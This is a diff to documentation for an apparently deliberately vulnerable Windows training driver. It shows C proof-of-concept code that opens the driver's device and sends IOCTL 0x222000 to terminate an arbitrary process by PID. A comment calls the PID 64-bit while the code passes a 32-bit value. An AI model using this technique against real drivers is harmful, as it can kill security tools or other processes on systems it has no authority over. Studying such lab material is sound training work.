@@ -74,21 +74,24 @@ An arbitrary process termination vulnerability exposes an unauthenticated IOCTL 
 The exposed IOCTL is invoked via the symbolic link `\\.\DVWD_WDM` and the IOCTL code 0x222000:
 
 ```
-HANDLE hDevice = INVALID_HANDLE_VALUE;
-DWORD bytesReturned = 0;
+static void TerminateProcess(DWORD targetPid)
+{
+    HANDLE hDevice = INVALID_HANDLE_VALUE;
+    DWORD bytesReturned = 0;
 
-hDevice = CreateFileW(L"\\\\.\\DVWD_WDM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-if (hDevice == INVALID_HANDLE_VALUE) {
-    printf("[-] Failed to open a handle to the driver. Error: %lu\n", GetLastError());
-    return;
+    hDevice = CreateFileW(L"\\\\.\\DVWD_WDM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to open a handle to the driver. Error: %lu\n", GetLastError());
+        return;
+    }
+
+    // Send the IOCTL with the 64-bit process ID
+    BOOL ret = DeviceIoControl(hDevice, 0x222000, &targetPid, sizeof(targetPid), NULL, 0, &bytesReturned, NULL);
+    if (!ret)
+        printf("[-] Driver IOCTL failed. Error: %lu\n", GetLastError());
+
+    CloseHandle(hDevice);
 }
-
-// Send the IOCTL with the 64-bit process ID
-BOOL ret = DeviceIoControl(hDevice, 0x222000, &targetPid, sizeof(targetPid), NULL, 0, &bytesReturned, NULL);
-if (!ret)
-    printf("[-] Driver IOCTL failed. Error: %lu\n", GetLastError());
-
-CloseHandle(hDevice);
 ```
 
 ### Arbitrary Memory Read
